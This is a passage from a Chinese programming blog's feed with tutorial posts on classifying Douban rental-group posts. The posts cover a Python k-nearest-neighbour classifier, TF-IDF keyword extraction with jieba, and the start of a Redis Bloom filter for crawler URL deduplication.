刷新了好多次， 一脸苦逼的说：“清完浏览器缓存了，还是有问题”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;后端老王略过一丝疑虑，难道是我接口出问题了，不该啊，刚还能用，都测试好几遍了，说道：“你看看是不是数据库存的测试数据有问题，删了再试试，或者换个浏览器，重启下 server。”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;前端小白照着老王的方法逐一尝试着。。。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;突然老王拍了下脑瓜，一脸尴尬的说：“小白，我刚 fix 一个线上 bug, 测试环境换了分支，所以接口出问题了。”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;小白一脸生无可恋的望着老王头顶的地中海发呆。。。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面情节纯属虚构，作为一个后端开发人员，我怎么忍心这么黑自己的同行呢 😭。不过思考下这么一个问题，前端如何能够快速的定位问题呢。这里面跟很多因素有关，比如前后端协作流程是否完善，前后端人员的经验。&lt;br&gt;
    
    </summary>
    
    
      <category term="web开发" scheme="http://yousite.com/tags/web%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>过滤豆瓣租房小组中介贴之 python 实现 k 近邻算法（四）</title>
    <link href="http://yousite.com/2017/03/06/%E8%BF%87%E6%BB%A4%E8%B1%86%E7%93%A3%E7%A7%9F%E6%88%BF%E5%B0%8F%E7%BB%84%E4%B8%AD%E4%BB%8B%E8%B4%B4%E4%B9%8B-python-%E5%AE%9E%E7%8E%B0-k-%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>http://yousite.com/2017/03/06/过滤豆瓣租房小组中介贴之-python-实现-k-近邻算法（四）/</id>
    <published>2017-03-06T05:21:02.000Z</published>
    <updated>2017-03-08T08:03:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>豆瓣有各种小组，每个小组会有个主题，比如租房小组基本里面全是房源相关的，当然偶尔也会有广告出现。那么如何能够让机器知道你发的帖子到底是哪个主题的呢，简单来说就是如何给帖子分类。这个时候需要介绍机器学习一个最简单的算法，叫 <code>k 近邻算法</code>。 原理介绍见这篇 <a href="http://coolshell.cn/articles/8052.html" target="_blank" rel="noopener">K NEAREST NEIGHBOR 算法</a>，</p><p><img src="/media/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-06%20%E4%B8%8B%E5%8D%881.35.46.png" alt="屏幕快照 2017-03-06 下午1.35.46"><br><a id="more"></a><br>图中的有两个类型的样本数据，一类是蓝色的正方形，另一类是红色的三角形。而那个绿色的圆形是我们待分类的数据。</p><ul><li>如果K=3，那么离绿色点最近的有2个红色三角形和1个蓝色的正方形，这3个点投票，于是绿色的这个待分类点属于红色的三角形。</li><li>如果K=5，那么离绿色点最近的有2个红色三角形和3个蓝色的正方形，这5个点投票，于是绿色的这个待分类点属于蓝色的正方形。</li></ul><p>所以如果假设我们已经有了一些帖子，并知道他们是哪些类型的，比如旅游相关的（蓝色），租房相关的（红色）。这个时候有个新的帖子（绿色）需要判断它属于哪一类，只要计算它与其它帖子的距离，然后选出 k 个最近的点，就可以知道这个帖子应该分到哪个类中。</p><p>下面我们用 python 来实现它<br>首先我们需要将文本内容向量化，同样用到了 jieba 分词</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut_word</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    (u'\u65b9\u5e84', 2.4582479479)</span></span><br><span class="line"><span class="string">    (u'\u82b3\u57ce\u56ed', 1.19547675029)</span></span><br><span class="line"><span class="string">    (u'\u53ef\u6708\u4ed8', 1.19547675029)</span></span><br><span class="line"><span class="string">    (u'\u4e00\u533a', 1.04666904475)</span></span><br><span class="line"><span class="string">    (u'\u5355\u95f4', 1.02371160058)</span></span><br><span class="line"><span class="string">    (u'\u51fa\u79df', 0.832472854883)</span></span><br><span class="line"><span class="string">    (u'\u5730\u94c1', 0.8200234078590001)</span></span><br><span class="line"><span class="string">    (u'\u4e2d\u4ecb', 0.7891864466530001)</span></span><br><span class="line"><span class="string">    (u'\u9644\u8fd1', 0.516934129144)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    tags = jieba.analyse.extract_tags(content, withWeight=<span class="keyword">True</span>, topK=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">return</span> tags</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_tags</span><span class="params">(*tags)</span>:</span></span><br><span class="line">    tag_dict_list = []</span><br><span class="line">    v_list = []</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</span><br><span class="line">        tag_dict_list.append(&#123;i[<span class="number">0</span>]: i[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> tag&#125;)</span><br><span class="line"></span><br><span class="line">    merged_tag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tag_dict_list:</span><br><span class="line">        merged_tag.extend(i.keys())</span><br><span class="line"></span><br><span class="line">    merged_tag = set(merged_tag)</span><br><span class="line">    <span class="keyword">for</span> tag_dict <span class="keyword">in</span> tag_dict_list:</span><br><span class="line">        v = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> merged_tag:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> tag_dict:</span><br><span class="line">                v.append(tag_dict[i])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                v.append(<span class="number">0</span>)</span><br><span class="line">        v_list.append(v)</span><br><span class="line">    <span class="keyword">return</span> v_list</span><br></pre></td></tr></table></figure><p>接下来就是 knn 算法的实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kNNClassify</span><span class="params">(newInput, dataSet, labels, k)</span>:</span></span><br><span class="line">    numSamples = dataSet.shape[<span class="number">0</span>]  <span class="comment"># shape[0] 代表行的数目</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤1：计算欧几里得距离</span></span><br><span class="line">    diff = tile(newInput, (numSamples, <span class="number">1</span>)) - dataSet</span><br><span class="line">    squaredDiff = diff ** <span class="number">2</span></span><br><span class="line">    squaredDist = sum(squaredDiff, axis=<span class="number">1</span>)</span><br><span class="line">    distance = squaredDist ** <span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤2：对距离排序</span></span><br><span class="line">    sortedDistIndices = argsort(distance)</span><br><span class="line"></span><br><span class="line">    classCount = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(k):</span><br><span class="line">        <span class="comment"># 步骤3：选择最近的 k 个距离</span></span><br><span class="line">        voteLabel = labels[sortedDistIndices[i]]</span><br><span class="line">        <span class="comment"># 步骤4：对 label 次数计数</span></span><br><span class="line">        classCount[voteLabel] = classCount.get(voteLabel, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步骤5：返回投票最大的结果</span></span><br><span class="line">    sortedClassCount = sorted(classCount.iteritems(), key=operator.itemgetter(<span class="number">1</span>), reverse=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">return</span> sortedClassCount[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>这里面我们计算使用的是欧几里得距离，其实我们也可以用前面的余弦相似度来做比较。</p><p>测试下看看效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 租房相关</span></span><br><span class="line">    content1 = <span class="string">u"""</span></span><br><span class="line"><span class="string">                可月付 无中介 方庄地铁附近 芳城园一区单间出租</span></span><br><span class="line"><span class="string">                我的房子在方庄地铁附近的芳城园一区，正规小区楼房，</span></span><br><span class="line"><span class="string">                三家合住，现出租一间主卧和一间带小阳台次卧，室内家电齐全，</span></span><br><span class="line"><span class="string">                冰箱，洗衣机等都有，可洗澡上网，做饭都可以，小区交通便利，四通八达，</span></span><br><span class="line"><span class="string">                希望入住的是附近正常上班的朋友</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">    content2 = <span class="string">u"""</span></span><br><span class="line"><span class="string">                可月付 无中介 方庄地铁附近 芳城园一区主卧次卧出租</span></span><br><span class="line"><span class="string">                我的房子在方庄地铁附近的芳城园一区，正规小区楼房，</span></span><br><span class="line"><span class="string">                三家合住，现出租一间主卧和一间带小阳台次卧，室内家电齐全，</span></span><br><span class="line"><span class="string">                冰箱，洗衣机等都有，可洗澡上网，做饭都可以，小区交通便利，四通八达，</span></span><br><span class="line"><span class="string">                希望入住的是附近正常上班的朋友</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line"></span><br><span class="line">    content3 = <span class="string">u"""方庄地铁附近 芳城园一区次卧出租</span></span><br><span class="line"><span class="string">                    我的房子在方庄地铁附近的芳城园一区，正规小区楼房，</span></span><br><span class="line"><span class="string">                    三家合住，现出租一间主卧和一间带小阳台次卧，室内家电齐全，</span></span><br><span class="line"><span class="string">                    冰箱，洗衣机等都有，可洗澡上网，做饭都可以，小区交通便利，四通八达，</span></span><br><span class="line"><span class="string">                    希望入住的是附近正常上班的朋友</span></span><br><span class="line"><span class="string">                    """</span></span><br><span class="line"></span><br><span class="line">    test_content4 = <span class="string">u"""二环玉蜓桥旁下月27号后可入住二居</span></span><br><span class="line"><span class="string">                方庄方古园一区5号楼下月27日到期出租，</span></span><br><span class="line"><span class="string">                我是房主无中介费 ，新一年租6000元每月押一付三，主次卧可分开住。</span></span><br><span class="line"><span class="string">                距地铁5号线蒲黄榆站5分钟路程。房屋60平正向，另有看守固定车位。</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">    <span class="comment"># 旅游相关</span></span><br><span class="line">    content5 = <span class="string">u"""世界尽头和冷酷仙境 去南极大部分都是从乌斯怀亚出发，</span></span><br><span class="line"><span class="string">                        这是南美大陆的最南端，所以也被称为世界尽头。在这里，有很多东西都已经到了终点：</span></span><br><span class="line"><span class="string">                        世界最尽头的邮局；世界最尽头的徒步线路；还有传说中“泛美公路”的终点，</span></span><br><span class="line"><span class="string">                        这条路从阿拉斯加一路向南开过来，17848公里，开到这里居然也到头了，没路了…然而，</span></span><br><span class="line"><span class="string">                        世界尽头也可以是起点，这里距离南极大陆只有不到1000公里的距离，世界尽头之后就是冷酷仙境。</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">    content6 = <span class="string">u"""走 走停停，看看世界上其中一条最美丽最浪漫的海岸线：那不勒斯湾到amalfi 海岸。</span></span><br><span class="line"><span class="string">                    欧洲 最美是小镇，意大利南部小镇与北部山区小镇完全不一样的风格但又一样是浪漫和美丽的世 外桃源。</span></span><br><span class="line"><span class="string">                    这个海岸线之所以美，原因跟托斯卡纳的山区一样， 建筑与自然的完美融合。海、 山与小屋群形成了一副美丽的风景画。</span></span><br><span class="line"><span class="string">                    沿着铁路和公路，陆路从那不勒斯走到Amalfi。</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">    content7 = <span class="string">u"""仙本娜是一个几乎由潜水业支撑的小镇，走几步路就是潜店，</span></span><br><span class="line"><span class="string">                    来自世界各地的游客每个人都在说着潜水。不大，但是比起马布就丰富多了，</span></span><br><span class="line"><span class="string">                    有旅馆，酒吧，咖啡店，饭店，小卖部，还有一个大超市。到了仙本娜，</span></span><br><span class="line"><span class="string">                    去一间叫龙门客栈（DRAGON ING）的旅馆CHECK IN。这是一件建在水上的树皮旅馆，</span></span><br><span class="line"><span class="string">                    不论室内室外的墙面全部是树皮，很有原始的风味，房间内有冷风机，价格也不贵，66马币，</span></span><br><span class="line"><span class="string">                    一个大床，有电视机，带卫生间。从马布搬过来，觉得这个环境真是天堂。旅馆由水上的很多长廊组成，</span></span><br><span class="line"><span class="string">                    连成一条网，我几乎迷路。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line">    test_content8 = <span class="string">""" 环游世界当然不能真地把旅行都抛掉啦，伟大的古文明和异国文化是环游世界的其中一个重要目的。</span></span><br><span class="line"><span class="string">                    美洲的玛雅文明，非洲的埃及文明，亚洲的印度文明，一个个从人类起源就可以追溯的古文明。</span></span><br><span class="line"><span class="string">                    一个个让人目定口呆的世界文化遗产。感受人类的力量同时感受时间的伟大和残酷。 还有令人陶醉的异国文化，去捷克感受的波西米亚文化，</span></span><br><span class="line"><span class="string">                    到伦敦西区和纽约百老汇看歌舞剧等等，品味澳大利亚的葡萄酒苏格兰的威士忌墨西哥的龙舌兰。有时候，小资也是一种情调啊！</span></span><br><span class="line"><span class="string">                """</span></span><br><span class="line"></span><br><span class="line">    tag1 = cut_word(content1)</span><br><span class="line">    tag2 = cut_word(content2)</span><br><span class="line">    tag3 = cut_word(content3)</span><br><span class="line">    tag4 = cut_word(test_content4)</span><br><span class="line">    tag5 = cut_word(content5)</span><br><span class="line">    tag6 = cut_word(content6)</span><br><span class="line">    tag7 = cut_word(content7)</span><br><span class="line">    tag8 = cut_word(test_content8)</span><br><span class="line"></span><br><span class="line">    v = [tag1, tag2, tag3, tag4, tag5, tag6, tag7, tag8]</span><br><span class="line">    data = merge_tags(*v)</span><br><span class="line"></span><br><span class="line">    v4 = data.pop(<span class="number">3</span>)</span><br><span class="line">    v8 = data.pop()</span><br><span class="line"></span><br><span class="line">    dataSet = array(data)</span><br><span class="line">    labels = array([<span class="string">'租房'</span>, <span class="string">'租房'</span>, <span class="string">'租房'</span>, <span class="string">'旅游'</span>, <span class="string">'旅游'</span>, <span class="string">'旅游'</span>])</span><br><span class="line"></span><br><span class="line">    k = <span class="number">3</span></span><br><span class="line">    v4 = array(v4)</span><br><span class="line"></span><br><span class="line">    outputLabel = kNNClassify(v4, dataSet, labels, k)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Your input is: v4 and classified to class: "</span>, outputLabel</span><br><span class="line"></span><br><span class="line">    v8 = array(v8)</span><br><span class="line">    outputLabel = kNNClassify(v8, dataSet, labels, k)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Your input is: v8 and classified to class: "</span>, outputLabel</span><br></pre></td></tr></table></figure><p>content1, content2, content3 是我们已知的属于租房类别的，content5, content6, content7 是我们已知的属于旅游类别的，test_content4, test_content8 是需要测试的例子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your input is: v4 and classified to class:  租房</span><br><span class="line">Your input is: v8 and classified to class:  旅游</span><br></pre></td></tr></table></figure><p>代码见: <a href="https://gist.github.com/facert/972ee8e5801a51003534b1a9ceeda322" target="_blank" rel="noopener">https://gist.github.com/facert/972ee8e5801a51003534b1a9ceeda322</a></p><p>总结：</p><p>作为最简单的机器学习算法，k 近邻算法也有一定的局限性，比如分类速度慢，每一个测试用例，都需要和所有的训练样本计算距离。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;豆瓣有各种小组，每个小组会有个主题，比如租房小组基本里面全是房源相关的，当然偶尔也会有广告出现。那么如何能够让机器知道你发的帖子到底是哪个主题的呢，简单来说就是如何给帖子分类。这个时候需要介绍机器学习一个最简单的算法，叫 &lt;code&gt;k 近邻算法&lt;/code&gt;。 原理介绍见这篇 &lt;a href=&quot;http://coolshell.cn/articles/8052.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;K NEAREST NEIGHBOR 算法&lt;/a&gt;，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-06%20%E4%B8%8B%E5%8D%881.35.46.png&quot; alt=&quot;屏幕快照 2017-03-06 下午1.35.46&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="algorithm" scheme="http://yousite.com/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）</title>
    <link href="http://yousite.com/2017/02/04/%E8%BF%87%E6%BB%A4%E8%B1%86%E7%93%A3%E7%A7%9F%E6%88%BF%E5%B0%8F%E7%BB%84%E4%B8%AD%E4%BB%8B%E8%B4%B4%E4%B9%8B%20python%20%E5%AE%9E%E7%8E%B0%20TF-IDF%20%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://yousite.com/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）/</id>
    <published>2017-02-04T11:16:04.000Z</published>
    <updated>2017-02-05T06:51:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间写过一篇 <a href="https://facert.github.io/2016/11/24/%E8%BF%87%E6%BB%A4%E8%B1%86%E7%93%A3%E7%A7%9F%E6%88%BF%E5%B0%8F%E7%BB%84%E4%B8%AD%E4%BB%8B%E8%B4%B4%E4%B9%8B%20python%20%E5%AE%9E%E7%8E%B0%E4%BD%99%E5%BC%A6%E7%9B%B8%E4%BC%BC%E5%BA%A6%EF%BC%88%E4%B8%80%EF%BC%89/">过滤豆瓣租房小组中介贴之 python 实现余弦相似度（一）</a>, 这里面使用 <code>jieba</code> 将文档分词，然后计算对分词的结果向量化计算相似度。比如 <code>我的房子在方庄地铁附近的芳城园一区</code> 会被分词为 <code>方庄 芳城园 一区 地铁 房子 附近</code>，我们发现少了 <code>我 的 在</code> 这些词，在自然语言处理的过程中，称这些词为停用词，简单的说就是这些词对于分词结果没有多少帮助，所以需要直接过滤掉。因为我们直接调用 <code>jieba.analyse</code> 方法，所以停用词被直接过滤了，如果只是调用 <code>jieba.cut</code>，会将返回包含停用词的结果。<br><a id="more"></a><br>再回到刚才的例子， <code>方庄 芳城园 一区 地铁 房子 附近</code> 这个结果中到底哪个词需要重点关注，就是所谓的关键词。这个时候我们就引出了今天的主角，<code>TF-IDF 算法</code>， 具体原理可以参见这篇通俗易懂的文章，<a href="http://www.ruanyifeng.com/blog/2013/03/tf-idf.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2013/03/tf-idf.html</a> 。至于为什么一步步的得出这种算法，也可以参考数学之美第 11 章。</p><p>那么如何用 python 实现这种算法呢，看过原理的发现其实这个算法不难，我们发现 jieba 已经自带这个算法了， 基于 TF-IDF 算法的关键词抽取，代码示例： <a href="https://github.com/fxsjy/jieba/blob/master/test/extract_tags.py，" target="_blank" rel="noopener">https://github.com/fxsjy/jieba/blob/master/test/extract_tags.py，</a> 试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="string">u'我的房子在方庄地铁附近的芳城园一区'</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> jieba.analyse.extract_tags(content, topK=<span class="number">20</span>, withWeight=<span class="keyword">True</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(u&apos;\u65b9\u5e84&apos;, 2.0485399565833333)</span><br><span class="line">(u&apos;\u82b3\u57ce\u56ed&apos;, 1.9924612504833332)</span><br><span class="line">(u&apos;\u4e00\u533a&apos;, 1.7444484079166667)</span><br><span class="line">(u&apos;\u5730\u94c1&apos;, 1.3667056797650001)</span><br><span class="line">(u&apos;\u623f\u5b50&apos;, 1.0526507623933334)</span><br><span class="line">(u&apos;\u9644\u8fd1&apos;, 0.8615568819066667)</span><br><span class="line"></span><br><span class="line">方庄</span><br><span class="line">芳城园</span><br><span class="line">一区</span><br><span class="line">地铁</span><br><span class="line">房子</span><br><span class="line">附近</span><br></pre></td></tr></table></figure><p>对于租房子来说，地点确实最关键，所以 <code>方庄 芳城园 一区</code>三个词权重最高，然后是<code>地铁</code>，所以达到了想要的效果，当然只拿一个例子说明肯定是不够的。另外对于一些特殊的行业，有各自不同的术语，所以自定义语料很重要，比如租房的话，可以爬取所有租房帖子，然后分词，制作自己的语料库，最后得出的结果会更好。</p><p>自定义语料简单代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">all_dict = &#123;&#125;</span><br><span class="line">for line in lines:</span><br><span class="line">    temp_dict = &#123;&#125;</span><br><span class="line">    total += 1</span><br><span class="line">    cut_line = jieba.cut(line, cut_all=False)</span><br><span class="line">    for word in cut_line:</span><br><span class="line">        temp_dict[word] = 1</span><br><span class="line">    for key in temp_dict:</span><br><span class="line">        num = all_dict.get(key, 0)</span><br><span class="line">        all_dict[key] = num + 1</span><br><span class="line">for key in all_dict:</span><br><span class="line">    w = key.encode(&apos;utf-8&apos;)</span><br><span class="line">    p = &apos;%.10f&apos; % (math.log10(total/(all_dict[key] + 1)))</span><br></pre></td></tr></table></figure><p>代码引用自：<a href="https://github.com/fxsjy/jieba/issues/393" target="_blank" rel="noopener">https://github.com/fxsjy/jieba/issues/393</a></p><p>最后，<code>TF-IDF 算法</code> 应用非常广泛，比如你用搜索引擎搜索的时候，如何确定你一句话的搜索关键词是什么，它功不可没。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间写过一篇 &lt;a href=&quot;https://facert.github.io/2016/11/24/%E8%BF%87%E6%BB%A4%E8%B1%86%E7%93%A3%E7%A7%9F%E6%88%BF%E5%B0%8F%E7%BB%84%E4%B8%AD%E4%BB%8B%E8%B4%B4%E4%B9%8B%20python%20%E5%AE%9E%E7%8E%B0%E4%BD%99%E5%BC%A6%E7%9B%B8%E4%BC%BC%E5%BA%A6%EF%BC%88%E4%B8%80%EF%BC%89/&quot;&gt;过滤豆瓣租房小组中介贴之 python 实现余弦相似度（一）&lt;/a&gt;, 这里面使用 &lt;code&gt;jieba&lt;/code&gt; 将文档分词，然后计算对分词的结果向量化计算相似度。比如 &lt;code&gt;我的房子在方庄地铁附近的芳城园一区&lt;/code&gt; 会被分词为 &lt;code&gt;方庄 芳城园 一区 地铁 房子 附近&lt;/code&gt;，我们发现少了 &lt;code&gt;我 的 在&lt;/code&gt; 这些词，在自然语言处理的过程中，称这些词为停用词，简单的说就是这些词对于分词结果没有多少帮助，所以需要直接过滤掉。因为我们直接调用 &lt;code&gt;jieba.analyse&lt;/code&gt; 方法，所以停用词被直接过滤了，如果只是调用 &lt;code&gt;jieba.cut&lt;/code&gt;，会将返回包含停用词的结果。&lt;br&gt;
    
    </summary>
    
    
      <category term="algorithm" scheme="http://yousite.com/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）</title>
    <link href="http://yousite.com/2017/02/04/%E8%BF%87%E6%BB%A4%E8%B1%86%E7%93%A3%E7%A7%9F%E6%88%BF%E5%B0%8F%E7%BB%84%E4%B8%AD%E4%BB%8B%E8%B4%B4%E4%B9%8B%20python%20%E5%AE%9E%E7%8E%B0%20%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>http://yousite.com/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）/</id>
    <published>2017-02-04T09:43:00.000Z</published>
    <updated>2017-02-05T07:05:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实这篇文章跟过滤中介贴没什么关系，只是在爬豆瓣小组的时候遇到的一点思考，我们知道，其实爬虫就是循环的爬取网站的 url，但是怎么判断爬取的 url 是否重复呢，最简单的，维护一个列表，每次循环查找，很明显效率很低。进阶的，采用哈希表，每次查询都是 O(1), 看上去不错。不过如果一旦 url 大到一定程度时，单台机器的内存肯定吃不消，这个时候分布式方案就呼之欲出，变得越来越复杂。那么能不能在牺牲一点点精确性的前提下，有简单的方案呢，答案是肯定的。这就是 布隆过滤器。<br><a id="more"></a><br>布隆过滤器的原理是，当一个元素被加入集合时，通过 K 个散列函数将这个元素映射成一个位数组中的 K 个点，把它们置为1。检索时，我们只要看看这些点是不是都是 1 就（大约）知道集合中有没有它了：如果这些点有任何一个 0 ，则被检元素一定不在；如果都是 1 ，则被检元素很可能在。这就是布隆过滤器的基本思想。（引用自维基百科）。布隆过滤器可以看成是 bitmap 的扩展，它的优点是空间和时间复杂度都是常数，缺点是有一定的误算率。<br>具体还可以参考：<a href="https://segmentfault.com/a/1190000002729689" target="_blank" rel="noopener">https://segmentfault.com/a/1190000002729689</a><br><a href="https://zh.wikipedia.org/wiki/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8" target="_blank" rel="noopener">维基百科</a></p><p>我们写爬虫很多时候会使用 redis 作为各种队列来提高性能。同样，这次我们将用 redis 和 python 结合起来写个布隆过滤器。</p><p>首先需要实现一个求 hash 的函数，这里采用 murmurhash 算法。然后算出 k 个点的位置（这里是 7 个点）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">BIT_SIZE = <span class="number">5000000</span></span><br><span class="line">SEEDS = [<span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal_offsets</span><span class="params">(self, content)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> [mmh3.hash(content, seed) % BIT_SIZE <span class="keyword">for</span> seed <span class="keyword">in</span> SEEDS]</span><br></pre></td></tr></table></figure><p>接下来就是 insert 和 is_contains 方法</p><figure class="highlight python"><table><tr><td 